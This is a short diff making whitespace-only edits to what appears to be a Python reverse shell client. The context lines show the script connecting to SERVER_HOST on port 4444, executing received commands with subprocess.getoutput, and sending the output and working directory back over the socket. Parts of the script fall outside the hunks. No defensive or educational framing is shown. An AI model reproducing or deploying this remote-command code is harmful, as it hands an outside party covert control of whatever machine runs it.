@@ -9,7 +9,7 @@ SERVER_PORT = 4444
 BUFFER_SIZE = 1024 * 128
 SEPARATOR = "<sep>"
 
-s = socket.socket() 
+s = socket.socket()
 s.connect((SERVER_HOST, SERVER_PORT))
 
 cwd = os.getcwd()
@@ -30,9 +30,9 @@ while True:
             output = ""
     else:
         output = subprocess.getoutput(command)
-    
+
     cwd = os.getcwd()
     message = f"{output}{SEPARATOR}{cwd}"
     s.send(message.encode())
- 
+
 s.close()
